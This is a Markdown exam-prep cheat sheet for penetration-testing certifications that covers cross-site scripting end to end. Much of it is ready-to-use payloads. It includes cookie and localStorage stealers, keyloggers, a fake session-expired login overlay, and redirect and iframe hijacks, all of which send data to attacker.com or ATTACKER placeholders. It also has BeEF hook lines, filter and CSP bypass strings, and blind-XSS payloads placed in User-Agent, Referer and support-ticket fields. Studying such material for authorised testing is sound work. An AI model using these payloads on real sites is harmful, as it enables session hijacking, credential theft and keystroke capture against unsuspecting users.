# XSS Complete

> Cross-Site Scripting (XSS) complete reference for CPTS/OSCP exams. Three types: Reflected, Stored, DOM. Plus Blind XSS.

---

## 1. Types of XSS

### Reflected XSS

```
User -> Malicious link -> Server -> Response includes payload -> User's browser executes
```

- Payload is in the request (URL param, form field)
- Must social-engineer victim to click
- One-time execution

### Stored XSS

```
Attacker submits payload -> Server stores it -> Victim views page -> Payload executes
```

- Payload stored in database, comment field, profile
- No social engineering needed
- Most dangerous type

### DOM-Based XSS

```
Page loads -> JavaScript reads attacker-controlled source (URL hash, fragment) -> Writes to DOM unsafely
```

- Payload never reaches server
- Server-side detection fails
- Uses `document.write`, `innerHTML`, `eval`, etc.

### Blind XSS

```
Payload stored -> Admin/support views dashboard -> Payload executes -> Sends data to attacker
```

- Target: admin panels, ticket systems, log viewers
- Requires out-of-band callback
- See: [[#Blind XSS Detection]]

---

## 2. Detection Payloads

### Context-Specific Testing

```html
<!-- Context 1: Between HTML tags -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Context 2: Inside HTML attribute (unquoted) -->
" onmouseover="alert(1)
" autofocus onfocus="alert(1)

<!-- Context 3: Inside HTML attribute (quoted) -->
" onfocus="alert(1)" autofocus="x
" onmouseover="alert(1)" x="

<!-- Context 4: Inside script tags -->
';alert(1);//
</script><script>alert(1)</script>

<!-- Context 5: Inside event handler -->
'; alert(1); //

<!-- Context 6: Inside href/src -->
javascript:alert(1)

<!-- Context 7: CSS context -->
</style><script>alert(1)</script>
```

### Universal Detection Payloads

```html
<!-- Minimum to test -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Polyglot (works in multiple contexts) -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)>\x3e

<!-- Verify execution without alert() -->
<script>document.cookie</script>
<img src=x onerror=document.location='http://attacker.com/steal?c='+document.cookie>
```

### Quick Test Matrices

| Context | Test Payload | Expected Behavior |
|---------|-------------|-------------------|
| HTML body | `<script>alert(1)</script>` | Alert pops |
| HTML attribute | `" onfocus="alert(1)" autofocus` | Alert on focus |
| JavaScript string | `';alert(1);//` | Alert executes |
| URL parameter | `"><script>alert(1)</script>` | Alert pops |
| CSS block | `</style><script>alert(1)</script>` | Alert pops |

---

## 3. Exploitation Techniques

### Cookie Theft

```html
<!-- Classic cookie stealer -->
<script>
fetch('http://attacker.com/steal?c='+document.cookie)
</script>

<!-- Via Image request -->
<img src=x onerror=this.src='http://attacker.com/steal?c='+document.cookie>

<!-- Using Image() object -->
<script>new Image().src='http://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>

<!-- Steal all localStorage too -->
<script>
fetch('http://attacker.com/exfil?c='+document.cookie+'&s='+JSON.stringify(localStorage))
</script>
```

### Listener Setup

```bash
# Python HTTP server to catch cookies
python3 -m http.server 80

# Or with logging
sudo python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        with open('captures.txt', 'a') as f:
            f.write(self.path + '\n')
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
"
```

### Keylogging

```javascript
// Keylogger payload
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/k?k='+e.key)
}
</script>

// More thorough keylogger
<script>
(function() {
    var keys = '';
    document.onkeydown = function(e) {
        keys += e.key;
        if (keys.length > 10) {
            new Image().src = 'http://attacker.com/kl?q='+btoa(keys);
            keys = '';
        }
    };
})();
</script>
```

### Phishing (Login Form Injection)

```html
<!-- Fake login form overlay -->
<script>
document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">' +
'<h2>Session Expired</h2>' +
'<form id=f><input type=text name=user placeholder="Username"><br>' +
'<input type=password name=pass placeholder="Password"><br>' +
'<input type=submit value="Login"></form>' +
'<script>document.getElementById("f").onsubmit=function(){' +
'fetch("http://attacker.com/phish?u="+this.user.value+"&p="+this.pass.value);' +
'alert("Login failed, try again.");return false;}<\/script></div>';
</script>
```

### Page Defacement

```html
<!-- Simple deface -->
<script>document.body.innerHTML = '<h1>HACKED</h1><p>You have been pwned</p>'</script>

<!-- Redirect to malicious page -->
<script>window.location = 'http://attacker.com/malware.html'</script>

<!-- Iframe injection -->
<script>
var iframe = document.createElement('iframe');
iframe.src = 'http://attacker.com/phishing.html';
iframe.style.position = 'fixed';
iframe.style.top = '0';
iframe.style.left = '0';
iframe.style.width = '100%';
iframe.style.height = '100%';
document.body.appendChild(iframe);
</script>
```

### BeEF (Browser Exploitation Framework)

```bash
# Start BeEF
sudo beef-xss

# Default creds: beef:beef
# Hook URL: http://<your-ip>:3000/hook.js

# Hook payloads
<script src="http://YOUR_IP:3000/hook.js"></script>
</script><script src="http://YOUR_IP:3000/hook.js"></script>
<img src=x onerror="document.body.appendChild(document.createElement('script')).src='http://YOUR_IP:3000/hook.js'">

# Use BeEF commands:
# - Browser information gathering
# - Screenshot capture
# - Keylogging
# - Clipboard access
# - Social engineering modules
# - Metasploit integration
```

---

## 4. Filter Evasion

### Tag/Attribute Bypasses

```html
<!-- Script tag blocked -> try other tags -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio onloadstart=alert(1)>

<!-- Event handler variations -->
onclick     onmouseover     onmouseout
onfocus     onblur          onload
onerror     onsubmit        onchange
onkeydown   onkeypress      onkeyup
ontoggle    oninput         onpointerenter
```

### Keyword Filters

```html
<!-- "alert" blocked -->
<script>prompt(1)</script>
<script>confirm(1)</script>
<script>(1,alert)(1)</script>
<script>window['alert'](1)</script>
<script>eval('al'+'ert(1)')</script>
<script>Function('alert(1)')()</script>
<script>location='javascript:alert(1)'</script>

<!-- "script" blocked -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### HTML Entity Encoding

```html
<!-- If the browser decodes entities in context -->
&#60;script&#62;alert(1)&#60;/script&#62;

<!-- Decimal encoding -->
&#115;&#99;&#114;&#105;&#112;&#116;alert(1)&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;

<!-- Hex encoding -->
&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;alert(1)&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;
```

### JavaScript String/Function Evasion

```javascript
// String fromCharCode bypass
String.fromCharCode(97,108,101,114,116,40,49,41)  // "alert(1)"

// Using eval + fromCharCode
eval(String.fromCharCode(97,108,101,114,116,40,49,41))

// setTimeout with string
setTimeout('alert(1)', 0)

// constructor technique
[].constructor.constructor('alert(1)')()
```

### Parenthesis-Free XSS

```html
<!-- Using location to avoid ()
Img src forms a valid script in some browsers -->
<img src=x onerror=location='javascript:alert\x281\x29'>

<!-- Using isContentEditable -->
<img src=x onerror=with(document)body.appendChild(createElement('script')).src='//attacker/hook.js'>
```

### CSS Injection for XSS

```html
<!-- CSS expression (old IE) -->
<div style="x:expression(alert(1))">

<!-- CSS import to steal pages -->
<style>@import url(http://attacker.com/steal);</style>
```

---

## 5. CSP Bypass

### CSP Header Examples

```http
Content-Security-Policy: default-src 'self'
Content-Security-Policy: script-src 'self' https://cdn.example.com
Content-Security-Policy: script-src 'unsafe-inline' 'self'
Content-Security-Policy: object-src 'none'; script-src 'self' https://cdnjs.cloudflare.com
Content-Security-Policy: script-src 'nonce-abc123'
```

### Bypass Techniques

```html
<!-- If CSP allows specific CDN (e.g., cdnjs) -->
<!-- Load a library with known JSONP endpoint -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<!-- Use $.getScript if allowed -->
<script>$.getScript('http://attacker.com/payload.js')</script>

<!-- JSONP callback exploitation -->
<script src="https://www.google.com/accounts/o8/id?id=123&openid.realm&openid.return_to&openid.assoc_handle&openid.ns=http://specs.openid.net/auth/2.0&openid.mode=checkid_setup&openid.claimed_id=http://specs.openid.net/auth/2.0/identifier_select&openid.identity=http://specs.openid.net/auth/2.0/identifier_select&openid.ui.ns=http://specs.openid.net/extensions/ui/1.0&openid.ui.mode=popup&openid.ui.icon=true&callback=alert(1)"></script>

<!-- If 'unsafe-inline' is present -->
<script>alert(1)</script>

<!-- If 'strict-dynamic' is set but a valid script src exists -->
<!-- Inject tag that loads whitelisted domain script, then it's trusted -->
<script src="/valid.js"></script>
<script>alert('now trusted')</script>

<!-- CSP with 'self' but file upload -->
<!-- Upload file containing JS, then include it -->
<script src="/uploads/evil.js"></script>

<!-- Base tag injection (change script src resolution) -->
<head><base href="http://attacker.com/"></head>
<script src="/js/app.js"></script>  <!-- loads http://attacker.com/js/app.js -->
```

### CSP Bypass Quick Reference

| CSP Directive | Bypass If... |
|---------------|-------------|
| `script-src 'self'` | Can upload files / JSONP on same origin / angular sandbox |
| `script-src 'unsafe-inline'` | Direct injection works |
| `script-src https://cdn.example.com` | CDN hosts Angular/React with CSP bypass gadgets |
| `script-src nonce-abc123` | Nonce appears in response anywhere? |
| `default-src 'none'` | Need to find `<meta>` with http-equiv=refresh or link tags |

---

## 6. Tools

### XSStrike

```bash
# Install
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip3 install -r requirements.txt

# Basic scan
python3 xsstrike.py -u "http://target.com/page.php?q=test"

# POST scan
python3 xsstrike.py -u "http://target.com/search" --data "q=test"

# Crawl and test
python3 xsstrike.py -u "http://target.com" --crawl

# Blind XSS
python3 xsstrike.py -u "http://target.com/page.php?q=test" --blind

# Custom headers
python3 xsstrike.py -u "http://target.com/page.php?q=test" --headers "Cookie: session=abc"

# Skip DOM scanning (faster)
python3 xsstrike.py -u "http://target.com/page.php?q=test" --skip-dom
```

### Dalfox

```bash
# Install
go install github.com/hahwul/dalfox/v2/cmd/dalfox@latest

# Basic scan
dalfox url "http://target.com/page.php?q=test"

# Single URL with options
dalfox url "http://target.com/page.php?q=test" --cookie "PHPSESSID=abc"

# POST mode
dalfox url "http://target.com/login" --data "user=admin&pass=test"

# Blind XSS with interactsh
dalfox url "http://target.com/page.php?q=test" --blind "http://attacker.com/hook"

# Multiple URLs from file
dalfox file urls.txt

# With custom parameters
dalfox url "http://target.com/search" --param "query"

# Mining mode (find hidden params)
dalfox url "http://target.com/page.php?q=test" --mining-dict
```

### Additional XSS Tools

```bash
# XSSer
xsser --url "http://target.com/page.php?q=test" --auto

# GIT: https://github.com/epsylon/xsser

# Gxss (reflected XSS finder)
gxss -u "http://target.com/page.php?q=test" -p "q"

# KXSS (parameter discovery + XSS)
kxss
```

---

## Blind XSS Detection

### Setting Up Blind XSS Callback

```bash
# Option 1: Interactsh (preferred - free, no setup)
# Install
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Get a unique callback URL
interactsh-client

# Option 2: Burp Collaborator (if licensed)
# Burp -> Burp Collaborator client -> Copy URL

# Option 3: Custom server
python3 -m http.server 80
nc -lnvp 80
```

### Blind XSS Payloads

```html
<!-- Common blind XSS vectors -->
<script>
fetch('http://INTERACTSH_URL/?c='+document.cookie)
</script>

<img src="http://INTERACTSH_URL/steal?c=document.cookie">

<!-- For user-agent exfiltration -->
<script>
new Image().src = 'http://INTERACTSH_URL/' + encodeURIComponent(navigator.userAgent)
</script>

<!-- For IP exfiltration -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://INTERACTSH_URL/?ip=' + location.hostname, true);
xhr.send();
</script>
```

### Common Blind XSS Targets

```html
<!-- Input forms - likely viewed by admin -->
<input name="name" placeholder="Your Name" value="PAYLOAD">
<textarea name="feedback">PAYLOAD</textarea>
<input name="email" value="PAYLOAD">

<!-- User-agent / Log fields -->
<!-- HTTP header reflected in admin dashboard -->
User-Agent: <img src=x onerror=fetch('http://ATTACKER/?UA='+document.cookie)>

<!-- Referer header -->
Referer: "><script>fetch('http://ATTACKER/?ref='+document.cookie)</script>

<!-- Support ticket systems -->
Subject: <img src=x onerror=fetch('http://ATTACKER/?data='+document.cookie)>
```

---

## XSS Quick Detection Reference

```txt
INPUT POINT                    PAYLOAD                              CONTEXT
------------------------------------------------------------------------------------------
/?q=test                       <script>alert(1)</script>           Reflected HTML
/profile.php?name=test         <svg onload=alert(1)>                Stored in profile
#/page                         javascript:alert(1)                 DOM URL fragment
/search?q=test                 " onfocus="alert(1)" autofocus      Attribute
/comments/1                    <script>alert(1)</script>           Stored (Blind XSS)
```

### Most Reliable Detection String

```txt
Standard: '"><img src=x onerror=alert(1)>
This puts quotes, angle brackets, and a function call all in one payload.
Use it on EVERY input field.
```

---

## Related Topics

- [[../../3.1 Recon and Discovery/Web Recon Methodology]] - Discovery workflow
- [[../3.2 SQL Injection/SQL Injection Complete]] - Compare with SQLi detection
- [[../3.6 Command Injection/Command Injection Complete]] - Server-side vs client-side
- [[../3.7 File Upload Attacks/File Upload Attacks Complete]] - XSS via file upload
